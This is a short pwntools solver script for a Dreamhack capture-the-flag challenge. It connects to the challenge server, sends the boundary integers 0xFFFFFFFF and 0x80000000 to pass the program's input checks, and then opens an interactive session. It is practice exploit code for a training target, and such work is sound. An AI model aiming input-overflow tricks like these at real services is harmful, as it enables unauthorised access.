from pwn import *

context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./chall")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host" + str(HOST) + ".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


a_ans = 0xFFFFFFFF
print(a_ans)
print(int(hex(a_ans), 16))
print(str(a_ans))
b_ans = 0x80000000
print(int(hex(b_ans), 16))

p.recvuntil("Your input : \n")
p.sendline(str(a_ans))
p.recvuntil("Success.\nYour second input : \n")
p.sendline(str(b_ans))
p.interactive()
